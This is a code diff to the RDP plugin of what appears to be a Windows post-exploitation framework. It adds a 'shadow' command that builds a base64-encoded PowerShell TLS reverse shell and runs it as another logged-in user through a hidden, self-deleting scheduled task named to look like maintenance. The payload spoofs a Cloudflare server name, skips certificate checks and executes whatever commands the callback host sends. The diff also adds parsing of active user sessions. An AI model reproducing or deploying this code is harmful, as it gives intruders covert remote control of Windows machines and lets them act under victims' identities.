@@ -1,5 +1,6 @@
 """Windows Remote Desktop configuration and recent target enumeration."""
 
+import base64
 import json
 
 from ...constants import PLUGIN_MARK_END, PLUGIN_MARK_START
@@ -9,13 +10,16 @@ from ..shared.runner import parse_collector_json, run_collector_plugin
 
 
 RDP_USAGE = """
-RDP — Remote Desktop configuration and management.
+RDP — Remote Desktop configuration, enumeration, and management.
 
 Usage:
-  run rdp                              Enumerate RDP configuration, status, and recent targets
+  run rdp                              Enumerate RDP configuration, status, sessions, and recent targets
   run rdp restricted-admin             Enable RDP Restricted Admin support
   run rdp start                        Enable Remote Desktop service and firewall rules
   run rdp adduser <user> <password>    Create a local user with admin and RDP access
+  run rdp shadow <user|session-id> -rh <host> -rp <port>
+                                       Launch a reverse shell as the target session's user
+                                       (transient scheduled task, runs in that user's session)
   run rdp help
 
 Examples:
@@ -23,9 +27,45 @@ Examples:
   run rdp restricted-admin
   run rdp start
   run rdp adduser newuser StrongPasswordHere
+  run rdp shadow admin -rh 10.0.0.5 -rp 4444
+  run rdp shadow 2 -rh 10.0.0.5 -rp 4444
 """.strip()
 
 PLUGIN_INFO = RDP_USAGE
+
+
+def _generate_reverse_shell_payload(callback_host: str, callback_port: int) -> str:
+    """Generate the Windows PowerShell TLS reverse shell payload.
+
+    Same payload used by the make_token plugin.
+    """
+    return (
+        "$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; "
+        "$TCPClient = New-Object Net.Sockets.TCPClient('" + callback_host + "', " + str(callback_port) + ");"
+        "$NetworkStream = $TCPClient.GetStream();"
+        "$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));"
+        "$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false);"
+        "if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned){$SslStream.Close();exit};"
+        "$StreamWriter = New-Object IO.StreamWriter($SslStream);"
+        "function WriteToStream($String){"
+        "[byte[]]$script:Buffer = New-Object System.Byte[] 4096;"
+        "$StreamWriter.Write($String + 'SHELL> ');"
+        "$StreamWriter.Flush()"
+        "};"
+        "WriteToStream '';"
+        "while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0){"
+        "$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);"
+        "$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String};"
+        "WriteToStream($Output)"
+        "};"
+        "$StreamWriter.Close()"
+    )
+
+
+def _pwsh_quote(s: str) -> str:
+    """Return s as a PowerShell single-quoted string."""
+    return "'" + s.replace("'", "''") + "'"
+
 
 def build_command():
     return rf"""
@@ -34,6 +74,7 @@ $start='{PLUGIN_MARK_START}'; $end='{PLUGIN_MARK_END}'
 $rdp=@{{}}
 $recent=@()
 $settings=@{{}}
+$sessions=@()
 try{{
   $ts='HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server'
   $rdp.Enabled=(Get-ItemProperty $ts -Name fDenyTSConnections -EA 0).fDenyTSConnections
@@ -64,13 +105,41 @@ try{{
   $settings.FirewallRules=@($fw|ForEach-Object{{ @{{name=$_.DisplayName;enabled=$_.Enabled;action=$_.Action}} }})
 }}catch{{}}
 try{{
-  $sessions=quser 2>$null
-  if($sessions){{ $settings.ActiveSessions=($sessions -split "`n").Count - 1 }}
-}}catch{{}}
+  $quserRaw=quser 2>$null
+  if($quserRaw){{
+    $lines=@($quserRaw -split "`r?`n" | Where-Object {{ $_ -match '\S' }})
+    foreach($line in $lines){{
+      $current=$line.StartsWith('>')
+      $clean=$line.TrimStart('>',' ').Trim()
+      $parts=$clean -split '\s+' | Where-Object {{ $_ -ne '' }}
+      if($parts.Count -lt 4){{ continue }}
+      if($parts[2] -notmatch '^\d+$'){{ continue }}
+      $sessions += [ordered]@{{
+        username=$parts[0]
+        session_name=$parts[1]
+        session_id=$parts[2]
+        state=$parts[3]
+        current=$current
+      }}
+    }}
+  }}
+}}catch{{
+  try{{
+    $raw=quser 2>$null
+    if($raw){{ $settings.SessionsRaw=@($raw -split "`r?`n") }}
+  }}catch{{}}
+}}
 $result=[ordered]@{{
-  summary=@{{RDP_Enabled=$rdp.Enabled;Port=$rdp.Port;Recent_Targets=$recent.Count;NLA=$rdp.NLA}}
+  summary=@{{
+    RDP_Enabled=$rdp.Enabled
+    Port=$rdp.Port
+    Recent_Targets=$recent.Count
+    NLA=$rdp.NLA
+    Sessions=$sessions.Count
+  }}
   rdp_configuration=$rdp
   recent_targets=$recent
+  sessions=$sessions
   client_settings=$settings
 }}
 Write-Output ($start+(ConvertTo-Json $result -Depth 5 -Compress)+$end)
@@ -168,6 +237,84 @@ Write-Output ($start+(ConvertTo-Json $result -Depth 5 -Compress)+$end)
 """
 
 
+def _build_shadow_command(target: str, callback_host: str, callback_port: int) -> str:
+    """Build a PowerShell command that launches the reverse shell as the target session's user."""
+    inner_ps = _generate_reverse_shell_payload(callback_host, callback_port)
+    inner_b64 = base64.b64encode(inner_ps.encode('utf-16le')).decode()
+    target_q = _pwsh_quote(target)
+
+    return rf"""
+$ErrorActionPreference='SilentlyContinue'
+$ProgressPreference='SilentlyContinue'
+$ConfirmPreference='None'
+$start='{PLUGIN_MARK_START}';$end='{PLUGIN_MARK_END}'
+$target={target_q}
+$result=[ordered]@{{action='shadow';ok=$false;target=$target;steps=@()}}
+
+# ---- 1. Find the session matching the target (username or session id) ----
+$sessionUser=$null
+$sessionId=$null
+$sessionState=$null
+try{{
+  $quserOut=quser 2>$null
+  if($quserOut){{
+    $lines=@($quserOut -split "`r?`n" | Where-Object {{ $_ -match '\S' }})
+    foreach($line in $lines){{
+      $clean=$line.TrimStart('>',' ').Trim()
+      $parts=$clean -split '\s+' | Where-Object {{ $_ -ne '' }}
+      if($parts.Count -lt 4){{ continue }}
+      if($parts[2] -notmatch '^\d+$'){{ continue }}
+      $u=$parts[0]; $sid=$parts[2]; $st=$parts[3]
+      if($u -eq $target -or $sid -eq $target){{
+        $sessionUser=$u; $sessionId=$sid; $sessionState=$st
+        break
+      }}
+    }}
+  }}
+}}catch{{}}
+
+if(-not $sessionUser){{
+  $result.error="No active RDP session found matching '$target'"
+}}else{{
+  $result.Add('session_user',$sessionUser)
+  $result.Add('session_id',$sessionId)
+  $result.Add('session_state',$sessionState)
+  $result.steps+=@{{step='lookup';ok=$true;detail="user=$sessionUser id=$sessionId state=$sessionState"}}
+
+  # ---- 2. Register transient scheduled task running as that user ----
+  $taskName='SysMaintenance_'+[Guid]::NewGuid().ToString('N').Substring(0,8)
+  $encCmd='{inner_b64}'
+
+  try{{
+    $action=New-ScheduledTaskAction -Execute 'powershell.exe' `
+      -Argument ('-NoP -NonI -W Hidden -Exec Bypass -EncodedCommand ' + $encCmd)
+    $principal=New-ScheduledTaskPrincipal -UserId $sessionUser -LogonType Interactive -RunLevel Highest
+    $trigger=New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(10)
+    $task=New-ScheduledTask -Action $action -Principal $principal -Trigger $trigger
+    Register-ScheduledTask -TaskName $taskName -InputObject $task -Force | Out-Null
+    $result.steps+=@{{step='register_task';ok=$true;detail="registered $taskName as $sessionUser"}}
+
+    Start-Sleep -Milliseconds 500
+    Start-ScheduledTask -TaskName $taskName -EA Stop
+    $result.steps+=@{{step='start_task';ok=$true;detail='task started in user session'}}
+
+    Start-Sleep -Seconds 3
+    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -EA 0
+    $result.steps+=@{{step='cleanup';ok=$true;detail='transient task removed'}}
+
+    $result.ok=$true
+    $result.message=("Reverse shell launched as '$sessionUser' (session $sessionId, state=$sessionState). " +
+                     "Callback: {callback_host}:{callback_port}. The running process is independent of the task.")
+  }}catch{{
+    $result.steps+=@{{step='deploy';ok=$false;detail=$_.Exception.Message}}
+    $result.error='Shadow deployment failed'
+    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -EA 0
+  }}
+}}
+
+Write-Output ($start+(ConvertTo-Json $result -Depth 5 -Compress)+$end)
+"""
+
 
 def _format_action_report(data: dict) -> str:
     action = data.get('action', 'rdp')
@@ -180,6 +327,12 @@ def _format_action_report(data: dict) -> str:
         lines.append(str(data['message']))
     if data.get('error'):
         lines.append(f"Error: {data['error']}")
+    if data.get('target'):
+        lines.append(f"Target: {data['target']}")
+    if data.get('session_user'):
+        sid = data.get('session_id', '?')
+        st = data.get('session_state', '?')
+        lines.append(f"Session: user={data['session_user']} id={sid} state={st}")
     if data.get('output'):
         lines.append(str(data['output']).strip())
     for step in data.get('steps') or []:
@@ -238,10 +391,55 @@ def _run_collect(session: SessionContext) -> int:
     )
 
 
+def _handle_shadow(session: SessionContext, args) -> int:
+    """Handle `rdp shadow <target> -rh <host> -rp <port>`."""
+    if len(args) < 2:
+        session.print(RDP_USAGE, 'yellow')
+        session.print("Error: rdp shadow requires <user|session-id> -rh <host> -rp <port>", 'red')
+        return 1
+
+    target = args[1].strip()
+    callback_host = None
+    callback_port = None
+
+    i = 2
+    while i < len(args):
+        a = args[i]
+        if a in ('-rh', '--callback-host') and i + 1 < len(args):
+            callback_host = args[i + 1].strip()
+            i += 2
+        elif a in ('-rp', '--callback-port') and i + 1 < len(args):
+            try:
+                callback_port = int(args[i + 1])
+            except ValueError:
+                session.print(f"Error: invalid port '{args[i + 1]}'", 'red')
+                return 1
+            i += 2
+        else:
+            session.print(f"Error: unknown argument for rdp shadow: {a}", 'red')
+            session.print(RDP_USAGE, 'yellow')
+            return 1
+
+    if not target:
+        session.print("Error: rdp shadow requires a non-empty target (user or session id)", 'red')
+        return 1
+    if not callback_host or not callback_port:
+        session.print("Error: rdp shadow requires both -rh <host> and -rp <port>", 'red')
+        return 1
+
+    session.print(f"Deploying shadow reverse shell as '{target}' -> {callback_host}:{callback_port}", 'yellow')
+    return _run_rdp_action(
+        session,
+        'rdp shadow',
+        _build_shadow_command(target, callback_host, callback_port),
+        timeout=90.0,
+    )
+
+
 @plugin.command(
     name='rdp',
     platforms=['windows'],
-    description='Remote Desktop configuration, enumeration, and management (restricted-admin, start, adduser)',
+    description='Remote Desktop configuration, enumeration, and management (restricted-admin, start, adduser, shadow)',
 )
 def run(session: SessionContext, args):
     if args and args[0].strip().lower() in ('-h', '--help', 'help', '?'):
@@ -272,6 +470,8 @@ def run(session: SessionContext, args):
             'rdp adduser',
             _build_adduser_command(username, password),
         )
+    if action == 'shadow':
+        return _handle_shadow(session, args)
 
     session.print(f"Unknown rdp subcommand: {args[0]}", 'red')
     session.print(RDP_USAGE, 'yellow')
